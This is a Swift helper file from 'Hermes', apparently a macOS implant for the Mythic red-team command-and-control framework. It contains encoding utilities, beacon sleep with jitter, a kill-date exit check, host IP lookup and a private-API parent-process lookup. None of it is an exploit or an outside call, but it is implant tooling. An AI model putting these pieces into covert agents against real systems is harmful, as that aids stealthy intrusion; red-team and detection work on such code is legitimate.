//
//  helper.swift
//  Hermes
//
//  Created by slyd0g on 5/28/21.
//

import Foundation

// https://stackoverflow.com/questions/26845307/generate-random-alphanumeric-string-in-swift/33860834
func generateSessionID(length: Int) -> String {

    let letters : NSString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    let len = UInt32(letters.length)

    var randomString = ""

    for _ in 0 ..< length {
        let rand = arc4random_uniform(len)
        var nextChar = letters.character(at: Int(rand))
        randomString += NSString(characters: &nextChar, length: 1) as String
    }

    return randomString
}

// https://stackoverflow.com/questions/29365145/how-can-i-encode-a-string-to-base64-in-swift
func toBase64(data: Data) -> String {
    return data.base64EncodedString(options: NSData.Base64EncodingOptions(rawValue: 0))
}

// https://stackoverflow.com/questions/31859185/how-to-convert-a-base64string-to-string-in-swift/31859383
func fromBase64(data: String) -> Data {
    return Data(base64Encoded: data)! //has crashed here before?
}

func toBase64URL(base64: String) -> String {
    let base64url = base64
        .replacingOccurrences(of: "+", with: "%2B")
        .replacingOccurrences(of: "/", with: "%2F")
        .replacingOccurrences(of: "=", with: "%3D")
    return base64url
}

func toString(data: Data) -> String {
    return String(decoding: data, as: UTF8.self)
}

func toData(string: String) -> Data {
    return Data(string.utf8)
}

func getIPAddress() -> String {
    var ip = ""
    let addresses = Host.current().addresses
    for address in addresses {
        if address.contains(".") && address != "127.0.0.1" {
            ip = address
            break
        }
    }
    return ip
}

public func randomNumber<T : SignedInteger>(inRange range: ClosedRange<T> = 1...6) -> T {
    let length = Int64(range.upperBound - range.lowerBound + 1)
    let value = Int64(arc4random()) % length + Int64(range.lowerBound)
    return T(value)
}

func sleepWithJitter() {
    // Calculate upper and lower range
    let lowerRange = Double(agentConfig.sleep) - round(Double(agentConfig.sleep) * Double(agentConfig.jitter) / 100.0);
    let upperRange = Double(agentConfig.sleep) + round(Double(agentConfig.sleep) * Double(agentConfig.jitter) / 100.0);
    
    // Sleep for random time inbetween range
    let sleepTime = randomNumber(inRange: Int(lowerRange)...Int(upperRange))
    //let sleepTime = Int.random(in: Int(lowerRange)...Int(upperRange))
    sleep(UInt32(sleepTime));
}

// https://stackoverflow.com/questions/24070450/how-to-get-the-current-time-as-datetime
func checkKillDate() {
    let currentDateTime = Date()
    let userCalendar = Calendar.current
    
    let requestedComponents: Set<Calendar.Component> = [
        .year,
        .month,
        .day,
    ]
    
    // Get the current date components
    let dateTimeComponents = userCalendar.dateComponents(requestedComponents, from: currentDateTime)
    
    // Get kill date from Mythic
    let killDate = (agentConfig.killDate).components(separatedBy: "-")
    let killDay = Int(killDate[2])!
    let killMonth = Int(killDate[1])!
    let killYear = Int(killDate[0])!
    
    // If current year is larger, exit
    if (killYear < dateTimeComponents.year!) {
        exit(0)
    }
    // If curerent year is equal, compare months
    else if (killYear == dateTimeComponents.year!) {
        // If killMonth has passed, exit
        if (killMonth < dateTimeComponents.month!) {
            exit(0)
        }
        // If killMonth is equal, compare days
        else if (killMonth == dateTimeComponents.month!) {
            // If killDay is passed or equal, exit
            if (killDay <= dateTimeComponents.day!) {
                exit(0)
            }
        }
    }
}

// https://github.com/themittenmac/TrueTree/blob/99972da3963bd57b6a64563c36b87030e024d1b9/Src/process.swift#L70
typealias rpidFunc = @convention(c) (CInt) -> CInt
func truePPID(_ pidOfInterest:Int) -> CInt {
    // Get responsible pid using private Apple API
    let rpidSym:UnsafeMutableRawPointer! = dlsym(UnsafeMutableRawPointer(bitPattern: -1), "responsibility_get_pid_responsible_for_pid")
    let pidCheck = unsafeBitCast(rpidSym, to: rpidFunc.self)(CInt(pidOfInterest))
    
    var responsiblePid: CInt
    if (pidCheck == -1) {
        responsiblePid = CInt(pidOfInterest)
    } else {
        responsiblePid = pidCheck
    }
    
    return responsiblePid
}

extension Date
{
    func toString( dateFormat format  : String ) -> String
    {
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = format
        return dateFormatter.string(from: self)
    }
    
}

// https://stackoverflow.com/questions/38343186/write-extend-file-attributes-swift-example
extension URL {
    /// Get list of all extended attributes.
    func listExtendedAttributes() throws -> [String] {
        
        let list = try self.withUnsafeFileSystemRepresentation { fileSystemPath -> [String] in
            let length = listxattr(fileSystemPath, nil, 0, 0)
            guard length >= 0 else { throw URL.posixError(errno) }
            
            // Create buffer with required size:
            var data = Data(count: length)
            let dataCount = data.count
            
            // Retrieve attribute list:
            let result = data.withUnsafeMutableBytes { [count = dataCount] in
                listxattr(fileSystemPath, $0, dataCount, 0)
            }
            guard result >= 0 else { throw URL.posixError(errno) }
            
            // Extract attribute names:
            let list = data.split(separator: 0).flatMap {
                String(data: Data($0), encoding: .utf8)
            }
            return list
        }
        return list
    }
    
    /// Helper function to create an NSError from a Unix errno.
    private static func posixError(_ err: Int32) -> NSError {
        return NSError(domain: NSPOSIXErrorDomain, code: Int(err),
                       userInfo: [NSLocalizedDescriptionKey: String(cString: strerror(err))])
    }
}
